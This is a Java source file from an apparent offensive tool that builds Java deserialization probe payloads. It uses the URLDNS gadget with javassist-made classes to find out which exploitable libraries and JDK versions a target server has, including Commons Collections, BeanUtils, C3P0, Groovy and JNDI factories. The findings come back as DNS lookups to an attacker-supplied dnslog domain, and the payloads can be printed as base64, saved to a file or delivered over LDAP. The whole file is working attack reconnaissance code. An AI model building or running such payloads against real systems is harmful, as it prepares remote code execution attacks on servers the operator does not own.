package main;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import javassist.ClassPool;
import javassist.CtClass;


public class en {
	static List<Object> list = new LinkedList<Object>();
	static String dnslog;
	static String[] defaultclass = {"CommonsCollections13567",
  				"CommonsCollections24",
  				"CommonsBeanutils2",
				"C3P0",
  				"AspectJWeaver",
  				"bsh",
  				"Groovy",
  				"Becl",
  				"Jdk7u21",
  				"winlinux"};
	static String[] jndidefaultclass = {"javax.el.ELProcessor",
			"org.apache.naming.factory.BeanFactory",
			"groovy.lang.GroovyShell",
			"groovy.lang.GroovyClassLoader",
			"org.yaml.snakeyaml.Yaml",
			"com.thoughtworks.xstream.XStream",
			"org.mvel2.sh.ShellSession",
			"org.apache.catalina.UserDatabase",
			"org.apache.catalina.users.MemoryUserDatabaseFactory",
			"org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
			"org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory",
			"org.apache.commons.dbcp2.BasicDataSourceFactory",
			"org.apache.commons.dbcp.BasicDataSourceFactory",
			"org.apache.tomcat.jdbc.pool.DataSourceFactory",
			"com.alibaba.druid.pool.DruidDataSourceFactory"};
	
	
    public static void main(String act, String clazzs, String dns) throws Exception {
  		dnslog = dns;
  		List arraylistclazz = Arrays.asList(clazzs.split("\\|"));

  		if(act.equals("base64")) {
  	  		for (Iterator iterator = arraylistclazz.iterator(); iterator.hasNext();) {
  				String clazz = (String) iterator.next();
  				setlist(clazz);
  			}
  	        ByteArrayOutputStream out = new ByteArrayOutputStream();
  	        ObjectOutputStream os = new ObjectOutputStream(out);
  	        os.writeObject(list);
  	        String base64 = java.util.Base64.getEncoder().encodeToString(out.toByteArray());
  	        System.out.println(base64);
  	        
  		}else if(act.equals("file")){
  	  		for (Iterator iterator = arraylistclazz.iterator(); iterator.hasNext();) {
  				String clazz = (String) iterator.next();
  				setlist(clazz);
  			}
  	    	ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));
  	    	oos.writeObject(list);
  	    	
		}else if(act.equals("ldap")){
  	  		for (Iterator iterator = arraylistclazz.iterator(); iterator.hasNext();) {
  				String clazz = (String) iterator.next();
  				setlist(clazz);
  			}
  	  		if(arraylistclazz.contains("all")) {
  	  			setlist("jndiall");
  	  		}
  	        ByteArrayOutputStream out = new ByteArrayOutputStream();
  	        ObjectOutputStream os = new ObjectOutputStream(out);
  	        os.writeObject(list);
  	        String base64 = java.util.Base64.getEncoder().encodeToString(out.toByteArray());
  	        ldapexp.main(base64, dnslog);
		}
    }
    
    
    
    public static  void setlist(String clazzName) throws Exception{
    	switch (clazzName) {
		case "CommonsCollections13567":
	    	//CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
	    	HashMap cc31321 = getURLDNSgadget("http://cc31321."+dnslog, "org.apache.commons.collections.functors.ChainedTransformer");
	    	HashMap cc322 = getURLDNSgadget("http://cc322."+dnslog, "org.apache.commons.collections.ExtendedProperties$1");
	  		list.add(cc31321);
	  		list.add(cc322);
			break;
		case "CommonsCollections24":
	    	//CommonsCollections2/4链,需要4-4.0版本
	    	HashMap cc40 = getURLDNSgadget("http://cc40."+dnslog,  "org.apache.commons.collections4.functors.ChainedTransformer");
	    	HashMap cc41 = getURLDNSgadget("http://cc41."+dnslog,  "org.apache.commons.collections4.FluentIterable");
	  		list.add(cc40);
	  		list.add(cc41);
			break;
		case "CommonsBeanutils2":
	    	//CommonsBeanutils2链,serialVersionUID不同,1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608
			HashMap cb17 = getURLDNSgadget("http://cb17."+dnslog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
	    	HashMap cb18x = getURLDNSgadget("http://cb18x."+dnslog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
	    	HashMap cb19x = getURLDNSgadget("http://cb19x."+dnslog, "org.apache.commons.beanutils.BeanIntrospectionData");
	    	list.add(cb17);
	  		list.add(cb18x);
	  		list.add(cb19x);
			break;
		case "C3P0":
	    	//c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为7387108436934414104
	    	HashMap c3p092x = getURLDNSgadget("http://c3p092x."+dnslog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
	    	HashMap c3p095x = getURLDNSgadget("http://c3p095x."+dnslog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
	  		list.add(c3p092x);
	  		list.add(c3p095x);
			break;
		case "AspectJWeaver":
	    	//AspectJWeaver,需要cc31
	    	HashMap ajw = getURLDNSgadget("http://ajw."+dnslog, "org.aspectj.weaver.tools.cache.SimpleCache");
	  		list.add(ajw);
			break;
		case "bsh":
	  		//bsh,serialVersionUID不同,2.0b4为4949939576606791809,2.0b5为4041428789013517368,2.0.b6无法反序列化
	  		HashMap bsh20b4 = getURLDNSgadget("http://bsh20b4."+dnslog, "bsh.CollectionManager$1");
	  		HashMap bsh20b5 = getURLDNSgadget("http://bsh20b5."+dnslog, "bsh.engine.BshScriptEngine");
	  		HashMap bsh20b6 = getURLDNSgadget("http://bsh20b6."+dnslog, "bsh.collection.CollectionIterator$1");
	  		list.add(bsh20b4);
	  		list.add(bsh20b5);
	  		list.add(bsh20b6);
			break;
		case "Groovy":
	  		//Groovy,1.7.0-2.4.3,serialVersionUID不同,2.4.x为-8137949907733646644,2.3.x为1228988487386910280
	  		HashMap groovy1702311 = getURLDNSgadget("http://groovy1702311."+dnslog, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
	  		HashMap groovy24x = getURLDNSgadget("http://groovy24x."+dnslog, "groovy.lang.Tuple2");
	  		HashMap groovy244 = getURLDNSgadget("http://groovy244."+dnslog, "org.codehaus.groovy.runtime.dgm$1170");
	  		list.add(groovy1702311);
	  		list.add(groovy24x);
	  		list.add(groovy244);
			break;
		case "Becl":
	  		//Becl,JDK<8u251
	  		HashMap becl = getURLDNSgadget("http://becl."+dnslog, "com.sun.org.apache.bcel.internal.util.ClassLoader");
	  		list.add(becl);
			break;
		case "Jdk7u21":
	  		//JDK<=Jdk7u21
	  		HashMap Jdk7u21 = getURLDNSgadget("http://Jdk7u21."+dnslog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
	  		list.add(Jdk7u21);
			break;
		case "winlinux":
	  		//windows/linux版本判断
	  		HashMap linux = getURLDNSgadget("http://linux."+dnslog, "sun.awt.X11.AwtGraphicsConfigData");
	  		HashMap windows = getURLDNSgadget("http://windows."+dnslog, "sun.awt.windows.WButtonPeer");
	  		list.add(linux);
	  		list.add(windows);
			break;
		case "all":
			for (int i = 0; i < defaultclass.length; i++) {
				setlist(defaultclass[i]);
			}
			break;
		case "jndiall":
			for (int i = 0; i < jndidefaultclass.length; i++) {
				setlist(jndidefaultclass[i]);
			}
			break;
		default:
			HashMap hm = getURLDNSgadget("http://"+clazzName.replace(".", "_").replace("$", "_")+"."+dnslog, clazzName);
			list.add(hm);
			break;
		}
    	
    	
    }

    public static HashMap getURLDNSgadget(String urls, String clazzName) throws Exception{
    	HashMap hashMap = new HashMap();
  		URL url = new URL(urls);
  		Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
  		f.setAccessible(true);
  		f.set(url, 0);
  		try {
  			hashMap.put(url, makeClass(clazzName));
		} catch (Exception e) {
			System.out.println("错误！！！不能以java开头");
			System.out.println(e);
		}
  		f.set(url, -1);
        return hashMap;
    }
    
    public static Class makeClass(String clazzName) throws Exception{
    	
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }

}
